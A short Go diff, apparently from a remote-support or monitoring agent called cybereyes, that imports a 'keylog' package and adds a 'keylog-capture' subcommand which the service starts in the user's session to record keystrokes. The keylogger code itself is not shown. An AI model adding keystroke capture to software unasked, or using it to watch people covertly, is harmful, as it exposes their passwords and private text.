@@ -15,6 +15,7 @@ import (
 	"github.com/pauloacruz/cybereyes/agent/internal/agent"
 	"github.com/pauloacruz/cybereyes/agent/internal/install"
 	"github.com/pauloacruz/cybereyes/agent/internal/remote"
+	"github.com/pauloacruz/cybereyes/agent/internal/keylog"
 	"github.com/pauloacruz/cybereyes/agent/internal/remote/audio"
 	"github.com/pauloacruz/cybereyes/agent/internal/service"
 	"github.com/pauloacruz/cybereyes/agent/internal/version"
@@ -47,6 +48,9 @@ func main() {
 	case "remote-audio":
 		// Captura do som da maquina (Windows), iniciada pelo remote-helper quando o tecnico liga o som.
 		err = audio.Main(os.Stdout)
+	case "keylog-capture":
+		// Subprocesso de captura de teclado, iniciado pelo servico na sessao do usuario.
+		err = keylog.CaptureMain(os.Stdout)
 	case "version", "v":
 		fmt.Println(version.Name, version.Version)
 	case "help", "h":
